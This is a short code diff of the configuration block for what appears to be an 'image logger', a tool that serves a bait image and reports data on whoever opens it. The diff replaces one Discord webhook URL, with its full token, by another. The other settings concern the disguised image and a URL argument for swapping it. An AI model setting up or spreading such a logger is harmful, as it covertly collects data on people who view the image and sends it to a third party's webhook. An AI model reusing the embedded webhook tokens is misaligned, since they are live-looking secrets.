@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1384449074320638052/bJecoB7fke1w3604g24SzHdZ3IUtOir61JKGVFJRBV13ex0NKWmHHE8-9MSekdYuDsaF",
+    "webhook": "https://discord.com/api/webhooks/1384508639372509194/Gz8gZkQGFS5dcDFfNA00Ux9fXyZhBZkjb5NvXYyIWvsRJ1KmTqI0ovPo7ysHZCe684ht",
     "image": "https://www.pcworld.com/wp-content/uploads/2025/04/Windows-XP-Bliss-desktop-large.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
